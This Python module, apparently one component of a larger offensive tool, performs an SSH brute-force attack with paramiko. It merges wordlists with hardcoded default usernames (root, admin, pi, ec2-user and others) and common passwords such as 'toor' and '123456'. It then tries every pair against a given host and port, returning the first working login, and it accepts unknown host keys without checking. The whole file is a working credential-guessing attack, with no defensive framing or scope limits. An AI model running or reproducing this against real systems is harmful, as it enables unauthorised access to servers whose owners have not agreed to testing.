import paramiko

def run(target, port, usernames_path="wordlists/port_users.txt", passwords_path="wordlists/port_pw.txt"):
	usernames = []
	passwords = []

	#debug
	#return {"success": True, "username": "user", "password": "pwd"}
	try:
		with open(usernames_path, "r") as f:
			for line in f:
				if line.strip() and line.strip() not in ["anonymous"]:
					usernames.append(line.strip())
	except FileNotFoundError:
		return {"success": False, "error": "Username file not found"}

	try:
		with open(passwords_path, "r") as f:
			for line in f:
				if line.strip():
					passwords.append(line.strip())
	except FileNotFoundError:
		return {"success": False, "error": "Password file not found"}


	common_usernames = ["root", "admin", "user", "test", "guest", "ubuntu", "debian", "pi", "ec2-user", "centos", "oracle", "fedora", "www-data", "sysadmin", "operator", "backup", "ftp", "mysql", "postgres", "admin1", "user1", "test1"]
	common_passwords = ["root", "123456", "password", "admin", "toor", "1234", "12345", "12345678", "qwerty", "abc123", "letmein"]
	for cun in common_usernames:
		if cun not in usernames:
			usernames.append(cun)
	for cpw in common_passwords:
		if cpw not in passwords:
			passwords.append(cpw)


	for user in usernames:
		for pwd in passwords:
			try:
				ssh = paramiko.SSHClient()
				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				ssh.connect(target, port=port, username=user, password=pwd, timeout=5)
				return {"success": True, "username": user, "password": pwd}
			except paramiko.AuthenticationException:
				continue
			except Exception as e:
				return {"success": False, "error": str(e)}
	return {"success": False}
